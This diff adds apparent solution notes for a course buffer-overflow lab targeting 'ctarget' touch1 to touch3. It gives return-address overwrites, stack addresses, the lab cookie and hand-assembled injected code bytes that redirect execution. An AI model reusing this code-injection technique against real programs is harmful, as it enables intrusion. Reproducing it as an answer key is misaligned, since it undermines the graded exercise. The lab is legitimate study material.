@@ -1,0 +1,60 @@
+
+1.ctarget::touch1
+target function address is 0x 00 00 00 00 40 17 c0 ( 8 bytes address)
+getbuf allocate 40 bytes by substract %rsp by 0x28
+run hex2raw, input 'c0 17 40 00 00 00 00 00' and redirect the outputs to a file,then insert 40 bytes before the address
+
+
+2.ctarget::touch2
+cookie:0x59b997fa
+
+build a input string to make the stack memory be like this:
+
+---stack bottom---
+...
+address of stack top  (replace the original ret address)
+...
+...
+ret
+mov touch2 address to (%rsp)
+modify %rsp
+set %rdi  
+---stack top---(0x000000005561dc78)     
+
+using gcc -c -Og c_touch2_helper.c  -fno-stack-protector  to get assembly code
+
+hex code of input file be like: 
+
+bf fa 97 b9 59       	mov    $0x59b997fa,%edi
+48 83 ec 08          	sub    $0x8,%rsp	
+48 c7 44 24 00 ec 17 	movq   $0x4017ec,0x0(%rsp)
+40 00
+c3			retq
+...
+...
+78 dc 61 55 00 00 00 00		// address of input, i.e. address of mov  $0x59b997fa,%edi
+0A			/n
+
+
+3.ctarget::touch3
+similar to touch2, but pass hex string of cookie as argument.
+cookie: 59b997fa
+hex ascii: 35 39 62 39 39 37 66 61 
+unsigned long value: 0x379634a8
+
+since stack memory will be overwriting, we could put it in a place far away from the current stack.
+such as 0x5561db78
+
+
+code:
+48 83 ec 08             	sub    $0x8,%rsp
+48 c7 44 24 00 fa 18 40 00  	movq   $0x4018fa,0x0(%rsp)	//touch3
+bf 78 db 61 55       		mov    $0x5561db78,%edi
+48 b8 35 39 62 39 39		movabs $0x6166373939623935,%rax
+37 66 61
+48 89 07             		mov    %rax,(%rdi)
+48 c7 47 08 00 00 00 		movq   $0x0,0x8(%rdi)
+00
+c3				ret
+
+
